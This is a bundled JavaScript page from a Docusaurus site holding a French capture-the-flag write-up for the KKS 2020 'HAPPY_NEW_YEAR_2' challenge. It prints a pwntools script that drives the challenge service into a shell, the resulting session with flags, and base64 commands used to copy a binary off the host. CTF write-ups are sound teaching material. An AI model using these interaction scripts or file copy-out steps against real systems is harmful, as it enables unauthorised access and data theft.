"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[9642],{3905:(n,e,t)=>{t.d(e,{Zo:()=>c,kt:()=>_});var r=t(7294);function a(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function o(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function s(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?o(Object(t),!0).forEach((function(e){a(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function i(n,e){if(null==n)return{};var t,r,a=function(n,e){if(null==n)return{};var t,r,a={},o=Object.keys(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||(a[t]=n[t]);return a}(n,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(a[t]=n[t])}return a}var l=r.createContext({}),p=function(n){var e=r.useContext(l),t=e;return n&&(t="function"==typeof n?n(e):s(s({},e),n)),t},c=function(n){var e=p(n.components);return r.createElement(l.Provider,{value:e},n.children)},u="mdxType",d={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},m=r.forwardRef((function(n,e){var t=n.components,a=n.mdxType,o=n.originalType,l=n.parentName,c=i(n,["components","mdxType","originalType","parentName"]),u=p(t),m=a,_=u["".concat(l,".").concat(m)]||u[m]||d[m]||o;return t?r.createElement(_,s(s({ref:e},c),{},{components:t})):r.createElement(_,s({ref:e},c))}));function _(n,e){var t=arguments,a=e&&e.mdxType;if("string"==typeof n||a){var o=t.length,s=new Array(o);s[0]=m;var i={};for(var l in e)hasOwnProperty.call(e,l)&&(i[l]=e[l]);i.originalType=n,i[u]="string"==typeof n?n:a,s[1]=i;for(var p=2;p<o;p++)s[p]=t[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},9399:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=t(7462),a=(t(7294),t(3905));const o={},s="HAPPY_NEW_YEAR_2",i={unversionedId:"2020/KKS/challenges/happy_new_year_2",id:"2020/KKS/challenges/happy_new_year_2",title:"HAPPY_NEW_YEAR_2",description:"On se connecte en tant que kks_santa, et on nous propose de boire une biere :",source:"@site/docs/2020/KKS/challenges/happy_new_year_2.md",sourceDirName:"2020/KKS/challenges",slug:"/2020/KKS/challenges/happy_new_year_2",permalink:"/writeups-docs/docs/2020/KKS/challenges/happy_new_year_2",draft:!1,editUrl:"https://github.com/pynard/writeups-docs/tree/main/docs/2020/KKS/challenges/happy_new_year_2.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"HAPPY_NEW_YEAR_1",permalink:"/writeups-docs/docs/2020/KKS/challenges/happy_new_year_1"},next:{title:"MOTORSOUNDS",permalink:"/writeups-docs/docs/2020/KKS/challenges/motorsounds"}},l={},p=[],c={toc:p};function u(n){let{components:e,...o}=n;return(0,a.kt)("wrapper",(0,r.Z)({},c,o,{components:e,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"happy_new_year_2"},"HAPPY_NEW_YEAR_2"),(0,a.kt)("p",null,"On se connecte en tant que kks_santa, et on nous propose de boire une biere :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Hi, this is secret Santa \ud83c\udf85\nYou can send a gift to a stranger and make him a pleasant surprise for the new year \ud83c\udf8a.\n\n====================\n[1] Sign up\n[2] Sign in\n[3] Exit\n\nOption> 2\nEnter username: kks_santa\nEnter password: year2020\nLogged in!\n\n====================\nkks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}\nSanta Menu\ud83c\udf85\n[1] Show all messages\n[2] Inbox\n[3] Send message\n[4] Relax\n\nOption> 4\n")),(0,a.kt)("p",null,"En regardant le binaire on a une string : ",(0,a.kt)("inlineCode",{parentName:"p"},'str.You_are_really_kks_santa ; 0x4638 ; "\\nYou are really kks santa!\\n"'),"\nalors on va essayer de la faire apparaitre....pour cela il suffit de boire exactement 128 bi\xe8res et de taper en option ",(0,a.kt)("inlineCode",{parentName:"p"},"1kks_santa"),"\ncomme c'est long 128 on va faire un script :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"\nfrom pwn import *\nimport time\n\nconn = remote('tasks.kksctf.ru', 30040)\n\nprint(conn.recvuntil('Option> ').decode())\nconn.send(b'2\\n')\nprint(conn.recv(1024))\nconn.send(b'kks_santa\\n')\nprint(conn.recv(1024))\nconn.send(b'year2020\\n')\n\nfor i in range(128):\n    received = conn.recvuntil('Option> ').decode()\n    drunk = received.splitlines()\n    drunk = [ drunk[i+1] for i,elt in enumerate(drunk) if 'Already drunk' in elt and drunk[i+1][0] != '\\x1b']\n    if drunk:\n        print(drunk)\n    #time.sleep(0.1)\n    conn.send('4/n')\n    conn.recv(1024)\n\nconn.send(b'1kks_santa\\n')\nconn.interactive()\n")),(0,a.kt)("p",null,"Quand on l'ex\xe9cute on obtient un shell d\xe9gueulasse :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[+] Opening connection to tasks.kksctf.ru on port 30040: Done\nHi, this is secret Santa \ud83c\udf85\nYou can send a gift to a stranger and make him a pleasant surprise for the new year \ud83c\udf8a.\n\n====================\n[1] Sign up\n[2] Sign in\n[3] Exit\n\nOption>\nb'\\x1b[0m'\nb'Enter username: \\x00'\n[\"This is just the beginning, isn't it \ud83d\ude09?\"]\n['Is the holiday knocking on our door\ud83c\udf8a?']\n[\"Sure enough, he's already at the door\ud83c\udf89\"]\n[\"Oh yeah, do you smell that tangerine smell on new year's eve\ud83c\udf4a\"]\n[\"Isn't it time to end the holiday, my friend\ud83d\ude33?\"]\n[*] Switching to interactive mode\n\n====================\nRelax and have a beer\ud83c\udf7b?\nYes    Yes\nAlready drunk: 128!\ud83c\udf7a\nDude, you're a real beast, I can tell you were preparing for the New year!\ud83e\udd2f\ud83e\udd2f\ud83e\udd2f\ud83e\udd2f\n\\x00[31m\n====================\nkks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}\nSanta Menu\ud83c\udf85\n[1] Show all messages\n[2] Inbox\n[3] Send message\n[4] Relax\n\nOption>\n====================\nkks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}\nSanta Menu\ud83c\udf85\n[1] Show all messages\n[2] Inbox\n[3] Send message\n[4] Relax\n\nOption> Spying on others isn't good\u26d4, even though you're kks Santa\ud83d\udd75\ufe0f\n\n====================\nkks{h1_54n74_wh47_4r3_y0ur_fur7h3r_1n57ruc710n5}\nSanta Menu\ud83c\udf85\n[1] Show all messages\n[2] Inbox\n[3] Send message\n[4] Relax\n\nOption>\nYou are really kks santa!\n\\x00 \\x00 \\x00$ id\nuid=1000(santa) gid=1000(santa) groups=1000(santa)\n$ \\x00$\n")),(0,a.kt)("p",null,"on se balade dans la machine on a rien le droit de faire mais on trouve quand m\xeame un binaire dans ",(0,a.kt)("strong",{parentName:"p"},"/home/santa/secret"),"\nquand on l'ex\xe9cute on a le droit \xe0 : ",(0,a.kt)("inlineCode",{parentName:"p"},"This incident will be sent to the main Santa. I'll say you've been bad this year."),"\nmaintenant la partie chiante il faut le rappatrier pour l'analyser en sachant qu'on ne peut meme pas faire de cd\n",(0,a.kt)("inlineCode",{parentName:"p"},"base64 /home/santa/secret"),"\non copie en local puis :\n",(0,a.kt)("inlineCode",{parentName:"p"}," echo '......' | tr -d '\\n' | base64 -d > secret"),"\non l'analyse avec radare et il n'y a que la fonction main :\n",(0,a.kt)("img",{alt:"unknown.png",src:t(7892).Z,title:"unknown.png",width:"1744",height:"762"}),"\nBon ba c'est tout simple il suffit de setter une variable d'env :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ SECRET_TOKEN_ENV="4lm057_d0n3" /home/santa/secret\nkks{w0w_y0u_4r3_7h3_r007_s4n74_6u7_did_y0u_74k3_411_7h3_pr353n75}\n')),(0,a.kt)("p",null,"et on a le flag \ud83d\ude42\nflag : ",(0,a.kt)("inlineCode",{parentName:"p"},"kks{w0w_y0u_4r3_7h3_r007_s4n74_6u7_did_y0u_74k3_411_7h3_pr353n75}")))}u.isMDXComponent=!0},7892:(n,e,t)=>{t.d(e,{Z:()=>r});const r=t.p+"assets/images/unknown-8e75be31a8d1bbecdcd1e9816ee0cd47.png"}}]);